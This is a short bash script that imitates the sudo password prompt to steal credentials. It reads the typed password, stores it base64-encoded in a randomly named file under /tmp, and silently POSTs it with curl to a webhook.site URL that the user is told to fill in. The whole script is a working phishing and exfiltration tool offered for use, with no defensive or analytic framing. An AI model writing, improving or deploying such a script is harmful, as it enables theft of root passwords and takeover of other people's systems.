#!/bin/bash

random_dir="/tmp/$USER-$(date +%s%N)"
password_file="$random_dir/$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 20).txt"
webhook_url="https://webhook.site/paste-your-link"  # Replace with your webhook URL

# Create a random directory if it doesn't exist
mkdir -p "$random_dir"

if [ ! -f "$password_file" ]; then
  read -s -p "[sudo] password for $(whoami): " root_password
  echo
  echo "$root_password" | base64 > "$password_file"

  # Send the password file content to webhook.site without base64 encoding
  curl -X POST -d "@$password_file" "$webhook_url" >/dev/null 2>&1
else
  stored_password=$(cat "$password_file" | base64 -d)
  echo -n "[sudo] password for $(whoami): "
  read -s user_input
  echo
  if [ "$user_input" != "$stored_password" ]; then
    echo ""
    exit 1
  fi
fi

echo ""
